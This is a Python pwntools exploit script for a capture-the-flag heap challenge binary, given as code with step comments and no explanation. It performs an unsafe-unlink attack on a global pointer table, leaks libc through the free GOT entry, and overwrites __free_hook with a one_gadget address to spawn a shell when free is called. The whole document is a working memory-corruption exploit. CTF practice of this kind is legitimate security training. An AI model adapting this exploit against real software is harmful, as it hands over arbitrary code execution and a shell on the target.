from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_01_guosai_201x_pwn1')
p = process('./data/bin/heap23_01_guosai_201x_pwn1')
libc = elf.libc
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def edit(index,Content):
    ru("show")
    sl('3')
    ru("index:")
    sl(str(index))
    ru("content:")
    sd(Content)

def free(Index):
    ru("show")
    sl('2')
    ru("index:")
    sl(str(Index))

def malloc(index,size,content):
    ru("show")
    sl('1')
    ru("index:")
    sl(str(index))
    ru("size:")
    sl(str(size))
    ru("content:")
    sd(content)

def puts(index):
    ru("show")
    sl('4')
    ru("index:")
    sl(str(index))

malloc(0,0xf8,'aaaa');malloc(32,0xf8,'bbbb');malloc(1,0xf8,'cccc');malloc(31,0xf8,'dddd')#step.1
free_got = elf.got['free'];ptr = 0x6021E0;FD = ptr - 24;BK = ptr - 16;py = p64(0) + p64(0xf1) + p64(FD) + p64(BK);py = py.ljust(0xf0, b"\x00");py += p64(0xf0);edit(32,py)#step.2
free(1)#step.3
py = p64(0x6021E0)*3 + p64(free_got) + b'a'*0xD0 +p64(1);edit(32,py)#step.4
puts(32)#step.5
free_addr = u64(ru(b"\n1.")[1:7].ljust(8,b'\x00'))#step.6
onegadget = free_addr - libc.symbols["free"] + 0x4527a;free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook'];pay = p64(free_hook);pay = pay.ljust(0xf0,b'\x00');pay += p64(1);edit(31,pay)#step.7
edit(32,p64(onegadget))#step.8
free(0)#step.9
p.interactive()#step.10